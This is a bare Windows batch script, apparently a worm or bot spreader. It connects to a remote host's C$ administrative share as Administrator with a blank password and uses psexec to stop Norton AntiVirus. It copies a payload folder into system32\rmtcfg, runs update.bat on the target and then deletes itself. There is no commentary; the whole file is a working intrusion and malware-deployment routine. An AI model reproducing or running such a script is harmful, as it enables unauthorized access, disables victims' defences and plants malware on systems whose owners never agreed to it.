net use z: /delete
net use \\67.20.127.67 /USER:Administrator
net use z: \\67.20.127.67\C$
psexec \\67.20.127.67 -u Administrator -p "" net stop "Norton AntiVirus Server"
psexec \\67.20.127.67 -u Administrator -p "" -c temp.bat
mkdir z:\winnt\system32\rmtcfg
mkdir z:\winnt\system32\catroot
copy copy\* z:\winnt\system32\rmtcfg
mkdir z:\winnt\system32\rmtcfg\files
mkdir z:\winnt\system32\rmtcfg\files\copy
mkdir z:\winnt\system32\rmtcfg\files\dat
mkdir z:\winnt\system32\rmtcfg\files\log
mkdir z:\winnt\system32\rmtcfg\files\plugin
copy C:\WINNT\SYSTEM32\RMTCFG\files\* z:\winnt\system32\rmtcfg\files
copy copy\* z:\winnt\system32\rmtcfg\files\copy
copy plugin\* z:\winnt\system32\rmtcfg\files\plugin
copy dat\* z:\winnt\system32\rmtcfg\files\dat
psexec \\67.20.127.67 -u Administrator -p "" -d c:\winnt\system32\rmtcfg\update.bat
net use z: /delete
net use \\67.20.127.67 /delete
del runme868122.bat
